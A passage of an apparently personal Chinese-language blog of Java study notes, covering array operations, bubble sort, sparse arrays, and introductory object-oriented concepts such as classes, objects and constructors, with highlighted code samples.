#ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(arrays[i]);</span></span><span class="line"><span style="color: #E06C75">        }</span></span></code></pre></div></div></figure></li><li><p>计算sum</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">int</span><span style="color: #E06C75"> sum </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">arrays</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">          sum </span><span style="color: #56B6C2">+=</span><span style="color: #E06C75"> arrays[i]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">      }</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sum=&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> sum);</span></span></code></pre></div></div></figure></li><li><p>寻找max</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">int</span><span style="color: #E06C75"> max </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> arrays[</span><span style="color: #D19A66">0</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">arrays</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (arrays[i] </span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> max) {</span></span><span class="line"><span style="color: #E06C75">                max </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> arrays[i]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>增强for循环</p><p><code>快捷语句：array.for</code>        省略了数组下标</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> array  </span><span style="color: #C678DD">:</span><span style="color: #E06C75">  array){</span><span style="color: #7F848E; font-style: italic">//int array相当于下标，array相当于这个数组</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(array);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>分装成方法的参数&#x2F;&#x2F;数组作为返回值</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//打印数组</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">printArray</span><span style="color: #E06C75">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] arrays){</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">arrays</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">print</span><span style="color: #ABB2BF">(arrays[i] </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot; &quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    } </span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">//反转数组 </span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] </span><span style="color: #61AFEF">reverse</span><span style="color: #E06C75">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] arrays){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] result </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[</span><span style="color: #E5C07B">arrays</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//反转的操作</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75">j</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">result</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">arrays</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++,</span><span style="color: #E06C75">j</span><span style="color: #ABB2BF">--</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        result[j] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> arrays[i]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> result</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>多维数组</p><p>数组的多重嵌套</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//输出二维数组</span></span><span class="line"><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">array</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> j </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> j </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> array[i]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> j</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(array[i][j]);</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span></code></pre></div></div></figure><ul><li>第一个条件 <code>i &lt; array.length</code> 是限制<strong>行下标 <code>i</code></strong> 的，<code>array.length</code> 表示二维数组的行数，确保 <code>i</code> 不会超出行的范围。</li><li>第二个条件 <code>j &lt; array[i].length</code> 是限制<strong>列下标 <code>j</code></strong> 的，<code>array[i].length</code> 表示第 <code>i</code> 行的列数，确保 <code>j</code> 不会超出当前行的列范围。</li></ul></li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><ol><li><p>arrays类</p><ul><li>数组的工具类java.util.Arrays</li><li>由于数组对象本身并没有什么方法可以供我们调用,但API中提供了一个工具类Arrays供我们使用,从而可以对数据对象进行一些基本的操作。</li><li>查看JDK帮助文档</li><li>Arrays类中的方法都是static修饰的静态方法,在使用的时候可以直接使用类名进行调用,而”不用“使用对象来调用(注意:是”不用”而不是“不能”)</li><li>具有以下常用功能:<br>◆给数组赋值:通过 fi 方法。<br>◆对数组排序:通过 sort 方法,<strong>升序</strong>,<br>◆比较数组:通过 equals 方法比较数组中元素值是否相等<br>◆查找数组元素:通过 binarySearch 方法能对排序好的数组进行二分查找法操作。</li></ul></li><li><p>冒泡排序（两层循环）</p><p>两两相邻比较，出现大小差异就交换顺序</p><p>每次比较都会出现max和min，下一轮就减少一次循环</p><p>依次循环，直到结束</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] </span><span style="color: #61AFEF">sort</span><span style="color: #E06C75">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75">[] array){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//临时变量</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> temp </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//外层循环，判断我们这个要走多少次；</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">array</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//内层循环，比价判断两个数，如果第一个数，比第二个数大，则交换位置</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> j </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> j </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">array</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">1</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">i </span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> j</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (array[j</span><span style="color: #56B6C2">+</span><span style="color: #D19A66">1</span><span style="color: #E06C75">]</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">array[j]){</span></span><span class="line"><span style="color: #E06C75">                temp </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> array[j]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">                array[j] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> array[j</span><span style="color: #56B6C2">+</span><span style="color: #D19A66">1</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">                array[j</span><span style="color: #56B6C2">+</span><span style="color: #D19A66">1</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> temp</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> array</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>稀疏数组</p><ul><li><p>当一个数组中大部分元素为0，或者为同一值的数组时，可以使用稀疏数组来保存该数组</p></li><li><p>稀疏数组的处理方式是:</p><p>◆记录数组一共有几行几列，有多少个不同值<br>◆把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125545873.png" alt="image-20251022164858914"></p><p>左边是原始数组，右边是压缩数组</p><ul><li>共六行七列（除去0），只有8个有效数字——-&gt;初始数组都是0（初始化）</li><li>后面就是坐标定位有效值                            ——-&gt;赋值替换有效值</li></ul></li></ol><h1 id="面向对象（op）"><a href="#面向对象（op）" class="headerlink" title="面向对象（op）"></a>面向对象（op）</h1><h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>面向对象    vs      面向过程</p><ul><li>面向对象：是线性的（第一步，第二步这样）——&gt;框架</li><li>面向过程：是分类思维（分类进行独立思考）——&gt;流程</li></ul><h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>面尚对象编程的本质就是:<strong>以类的方式组织代码，以对象的组织(封装)数据</strong></p><p>三大特性:<strong>封装   继承   多态</strong></p><p>从认识论角度考虑是先有对象后有类。对象，是具体的事物。类，是抽象的，是对对象的抽象</p><p>从<strong>代码运行角度考虑是先有类后有对象</strong>。类是对象的模板。</p><h2 id="类与对象的关系"><a href="#类与对象的关系" class="headerlink" title="类与对象的关系"></a>类与对象的关系</h2><ol><li><p>一个项目应该只存在一个main方法</p></li><li><p>一个类里面，只有可能存在<strong>属性和方法</strong>这俩东西</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//学生类</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Student</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//属性：字段</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//默认值nell</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span><span style="color: #7F848E; font-style: italic">//默认值0</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//方法</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> study</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #56B6C2">+</span><span style="color: #98C379">&quot;在学习&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p><code>this.name</code>指的是在这个类里面的属性</p></li><li><p>类——-&gt;对象           抽象——-&gt;实例</p><p>先输入 <code>new 类名()</code>（如 <code>new Student()</code>），然后使用快捷键 **<code>Ctrl + Alt + V</code>**，IDEA 会自动生成变量声明语句（如 <code>Student student = new Student();</code>）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Demo03</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//类：抽象的，实例化</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//类实例化后会返回一个自己的对象！</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//student对象就是一个Student类的具体实例！</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">xiaoming</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Student</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//Student student = new student();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">xh</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Student</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//Student student = new student();</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">xiaoming</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;小明&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E5C07B">xiaoming</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">xiaoming</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">xiaoming</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">xh</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">xh</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">age</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>结合上面写的，xiaoming.name &#x3D; “小明”;          xiaoming.age &#x3D; 3;这个对象已经赋值，所以返回赋值内容</p><p>xh这个对象并没有赋值，所以返回默认值</p></li></ol><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>生成alt+insert</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//java ---&gt; class</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Person</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//一个类即使什么都不写，它也会存在一个方法</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//显示的定义构造器</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//实例化初始值</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> Person</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;小明&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//一个项目应该只存一个main方法</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Application</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//new 实例化了一个对象</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">person</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Person</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//////如果在里断点</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">person</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">name</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic">//aaaa</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>使用断点检测：</p><ol><li>没走就是null</li><li>先到类里面的public Person</li><li>后面赋值”小明”（赋值是person类里面的 